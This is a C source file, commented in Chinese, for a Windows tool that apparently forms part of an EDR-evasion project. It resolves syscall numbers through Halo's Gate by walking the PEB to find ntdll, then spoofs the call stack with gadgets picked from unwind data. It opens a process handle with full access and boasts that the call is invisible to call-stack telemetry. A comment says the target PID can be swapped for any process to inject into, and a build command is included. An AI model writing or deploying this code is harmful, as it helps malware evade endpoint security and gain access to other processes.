/* main.c */
#include "halo_gate.h"
#include "spoof.h"
#include <intrin.h> // for __readgsqword

#define NTDLL_HASH 0x22d3b5ed

// 声明在 gate.s 中写的外部汇编函数
extern void SetSSN(DWORD ssn);
extern void SetSyscallAddr(PVOID addr);
extern void SetSpoofParams(PVOID gadgetAddr, DWORD stackSize);
extern NTSTATUS SpoofedSyscall();

// 必须的底层结构体定义

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

// 1. 万能签名：使用变参宏完美匹配 x64 ABI 的底层调用约定
typedef NTSTATUS (NTAPI* fnUniversalSpoof)(PVOID FirstArg, ...);

// 2. 智能 Gadget 选择器：根据参数数量确保栈空间足够，防止“自杀”
SPOOF_GADGET* GetSuitableGadget(DWORD argCount) {
    // x64 ABI: 前 4 个参数用寄存器，第 5 个及以后入栈
    // 所需最小栈大小 = 返回地址(8) + 影子空间(32) + 额外参数空间
    DWORD minStackRequired = 0x58; 
    if (argCount > 4) {
        minStackRequired += (argCount - 4) * 8; // 为每一个多出的参数增加 8 字节
    }

    for (int i = 0; i < g_GadgetCount; i++) {
        // 寻找第一个深度足够的黄金傀儡
        if (GoldenGadgets[i].dwStackSize >= minStackRequired) {
            return &GoldenGadgets[i];
        }
    }
    return NULL; 
}

// 强化版宏：使用 (fnUniversalSpoof) 进行暴力强转，解决参数数量检查报错
#define VEGA_CALL(ApiHash, ArgCount, ...) ({                                       \
    NTSTATUS _status = 0xC0000001;                                                 \
    PVOID _pAddr = GetApi(ApiHash);                                                \
    HALO_ENTRY _entry;                                                             \
    SPOOF_GADGET* _pGadget = GetSuitableGadget(ArgCount);                          \
                                                                                   \
    if (_pAddr && GetHaloEntry(_pAddr, &_entry) && _pGadget) {                     \
        SetSSN(_entry.SSN);                                                        \
        SetSyscallAddr(_entry.SyscallAddress);                                      \
        SetSpoofParams(_pGadget->pGadgetAddress, _pGadget->dwStackSize);           \
        fnUniversalSpoof _pFire = (fnUniversalSpoof)SpoofedSyscall;                \
        _status = _pFire(__VA_ARGS__);                                             \
    }                                                                              \
    _status;                                                                       \
})



int main() {
    //初始化检查
    BOOL bEngineReady = FALSE; 

    // ... 初始化 PEB 和 Ldr ...
    // 1. 获取 PEB
    PMY_PEB pPEB = (PMY_PEB)__readgsqword(0x60);
    PMY_PEB_LDR_DATA pLdr = pPEB->Ldr;
    
    // 2. 遍历模块链表
    LIST_ENTRY* pListHead = &pLdr->InMemoryOrderModuleList;
    LIST_ENTRY* pCurrentEntry = pListHead->Flink;

    PVOID pNtdll = NULL;//设置一个全局变量来存放ntdll.dll基地址



    //halo's gate逻辑
    printf("[*] Initialing Halo's Gate Logic...");
    while (pCurrentEntry != pListHead) {
        //获取pEntry
        PMY_LDR_DATA_TABLE_ENTRY pEntry = (PMY_LDR_DATA_TABLE_ENTRY)(
            (unsigned char*)pCurrentEntry - sizeof(LIST_ENTRY)
        );
        if (pEntry->BaseDllName.Buffer != NULL) {
            DWORD currentHash = djb2_hash(pEntry->BaseDllName.Buffer);
            
            if (currentHash == NTDLL_HASH) {
                printf("[+] Found ntdll.dll...\n");
                pNtdll = pEntry->DllBase; //赋值储存
                InitApiTable(pEntry->DllBase); // 初始化系统调用表
                bEngineReady = TRUE;           // 标记成功
                break;                         // 找到后立即退出循环
            }
        }
        pCurrentEntry = pCurrentEntry->Flink;
    }
    // 必须在循环外检查引擎是否就绪
    if (!bEngineReady) {
        printf("[-] Failed to initialize Engine. Aborting.\n");
        return -1;
    }

    //call stack spoofing逻辑
    DWORD dwRuntimeFunctionCount = 0; // 
    printf("[*] Initializing Call Stack Spoofing...");
    PVOID pRuntimeFunctionAddr = getRuntimeFunctionEntry(pNtdll, &dwRuntimeFunctionCount);
    
    unWindInfoResolution(pNtdll, pRuntimeFunctionAddr, &dwRuntimeFunctionCount);
    if (g_GadgetCount == 0) {
        printf("[-] No Golden Gadgets found. The gun is empty.\n");
        return -1;
    }
    printf("[!!!] %d Golem Gadgets Found...\n", g_GadgetCount);
    
    //开火
    //还是以NtOpenProcess为例，先通过Halo‘s Gate获取SSN和syscall。
    HANDLE hTargetProcess = NULL;
    OBJECT_ATTRIBUTES oa = { 0 };
    oa.Length = sizeof(OBJECT_ATTRIBUTES); // 必须初始化长度，否则内核会报错
        
    CLIENT_ID cid = { 0 };
    // 为了安全测试，我们 Open 我们自己。你可以替换成任何你想要注入的 PID
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)GetCurrentProcessId(); 
    NTSTATUS status = VEGA_CALL(0x5003c058, 4, &hTargetProcess, PROCESS_ALL_ACCESS, &oa, &cid);
    if (status == 0x00000000) {
        printf("[+] MASTERPIECE! Successfully got handle: 0x%p\n", hTargetProcess);
        printf("[+] This call was completely invisible to Call Stack Telemetry.\n");
    } else {
        printf("[-] Misfire! System call failed with status: 0x%08X\n", status);
    }
    getchar();
    return 0;
}

//x86_64-w64-mingw32-gcc -I include src/main.c src/halo_gate.c src/spoof.c asm/gate.s -o halo_spoofer.exe -m64 -static -w

/*
如果你要搬运 N 个参数，你寻找的傀儡 Gadget 的 size 必须大于 0x20 + (N * 8) 字节。 
比如有 6 个参数，就只使用 size >= 72 (0x48) 的 Gadget。这样 rsp + 0x28 就永远够不到 R11，你的返回地址就绝对安全。
*/